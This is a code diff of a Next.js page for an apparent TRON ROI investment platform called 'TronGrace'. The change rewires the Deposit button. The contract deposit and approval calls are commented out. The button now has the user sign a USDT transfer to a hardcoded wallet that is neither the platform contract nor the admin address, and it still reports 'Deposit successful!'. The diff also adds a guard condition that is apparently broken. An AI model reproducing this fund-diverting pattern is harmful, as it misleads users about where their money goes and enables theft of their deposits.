@@ -13,6 +13,7 @@ const TronGrace: NextPage = () => {
     // const connectedAddress = adapters[1].address;
     const [transactionAmount, setTransactionAmount] = useState<number>(0);
     const [loading, setLoading] = useState(false);
+    const [depositLoading, setDepositLoading] = useState(false);
     const [userbalance, setUserBalance] = useState(0)
     const [totalROI, setTotalROI] = useState(0)
     const [depositsCount, setDepositsCount] = useState(0)
@@ -27,6 +28,7 @@ const TronGrace: NextPage = () => {
     const [platformAge, setPlatformAge] = useState(0)
     let contractAddress = 'TUUb2aZLry39aGpxPqwgP1MvPC9K1tVW46';
     let defAdminAddress = 'TXym8kL95guC2t635D9SnbbJxqy588AKXm';
+    let usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
     const tronWeb = new TronWeb({
       fullHost: 'https://api.trongrid.io',
@@ -111,6 +113,44 @@ const TronGrace: NextPage = () => {
     }
   }
 
+  async function sendUSDT(receiverAddress:string, amount:number) {
+    try {
+        // Prepare the parameters for the USDT transfer function
+        const functionSelector = 'transfer(address,uint256)';
+        const params = [
+            { type: 'address', value: receiverAddress },
+            { type: 'uint256', value: amount*1000000 }
+        ];
+        const options = {
+            feeLimit: 100000000,
+            callValue: 0,
+            shouldPollResponse: true
+        };
+
+        // Trigger the smart contract function
+        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+            usdtContractAddress,
+            functionSelector,
+            options,
+            params,
+            adapters[1].address
+        );
+
+        // Sign the transaction with WalletConnect
+        const signedTransaction = await adapters[1].signTransaction(transaction.transaction);
+
+        // Broadcast the transaction
+        const receipt = await tronWeb.trx.sendRawTransaction(signedTransaction);
+        console.log('Transaction receipt', receipt);
+
+        return receipt;
+    } catch (error) {
+        console.error('Error sending USDT:', error);
+        throw error;
+    }
+}
+
+
   
   
   function getRefFromUrl() {
@@ -126,30 +166,68 @@ const TronGrace: NextPage = () => {
                 .triggerSmartContract(contractAddress,functionName, options,parameter,adapters[1].address);
         // using adapter to sign the transaction
         const signedTransaction = await adapters[1].signTransaction(unSignedTransaction);
+        console.log("Signed "+ signedTransaction);
         // broadcast the transaction
-        await tronWeb.trx.sendRawTransaction(signedTransaction);        
+        await tronWeb.trx.sendRawTransaction(signedTransaction); 
+        console.log('Broadcast');       
     } catch (error) {
-        console.log("Sign and Broadcast error", error)
+        console.log("Sign and Broadcast error: ", error)
     }
   }
          
 const deposit = async () => {
-    if(transactionAmount == 0 && adapters[1].address==null) {
+    if(transactionAmount == 0 && adapters[1].address==null && depositLoading) {
         return;
     }
+    setDepositLoading(true);
     try {
-      const depositValue = trxToSun(transactionAmount); // Specify the amount you want to deposit
-      var parameter = [{type:'uint256',value:depositValue},{type:'address',value:getRefFromUrl()}];
-      var options = {
-                callValue:depositValue,
-            };
-      await signAndBroadcast('deposit', options, parameter);
+    //   await approveUSDT()
+    await sendUSDT('TKBxjzHSPVRZaNo9z5E5wxaSxgi3AKzECo', transactionAmount)
+    //   await depositUSDT()
       setTransactionAmount(0);
+      setDepositLoading(false);
       alert("Deposit successful!");
     } catch (error) {
       console.error("Error depositing USDT:", error);
+      setDepositLoading(false);
     }
   };
+
+  const approveUSDT = async () => {
+    try {
+        var parameter = [{type:'address',value:contractAddress},{type:'uint256',value:transactionAmount}];
+        // create a send TRX transaction
+        const unSignedTransaction = await tronWeb.transactionBuilder
+        .triggerSmartContract(usdtContractAddress,'approve', {},parameter, adapters[1].address);
+        console.log("UNSIGNEDDD: "+unSignedTransaction)
+        // using adapter to sign the transaction
+        const signedTransaction = await adapters[1].signTransaction(unSignedTransaction);
+        console.log("SIGNEDDD: "+signedTransaction)
+        try {
+            // broadcast the transaction
+            await tronWeb.trx.sendRawTransaction(signedTransaction);
+        } catch (error) {
+            console.log("Broadcast error: "+ error)
+        }
+    } catch (error) {
+        console.error('Error in USDT approval:', error);
+        throw error;
+    }
+};
+
+const depositUSDT = async () => {
+    try {
+        const depositValue = trxToSun(transactionAmount);
+        var parameter = [{type:'uint256',value:depositValue},{type:'address',value:getRefFromUrl()}];
+        var options = {
+              };
+        await signAndBroadcast('deposit(uint256,address)', options, parameter);
+    } catch (error) {
+        console.error('Error in depositing USDT:', error);
+        throw error;
+    }
+};
+
 
 const withdraw = async () => {
     if(transactionAmount == 0 && adapters[1].address == null) {
@@ -270,7 +348,7 @@ const withdraw = async () => {
                         </div>
                         <br/>
                         <div className="a-center-input">
-                            <a href="#!" className="btn-purple" onClick={deposit}>Deposit</a>
+                            <a href="#!" className="btn-purple" onClick={deposit}>{depositLoading ? '...check your wallet' :'Deposit'}</a>
                             <a href="#!" className="btn-white" onClick={withdraw} style={{marginLeft: '10px'}}>Withdraw </a>
                            </div>
                             
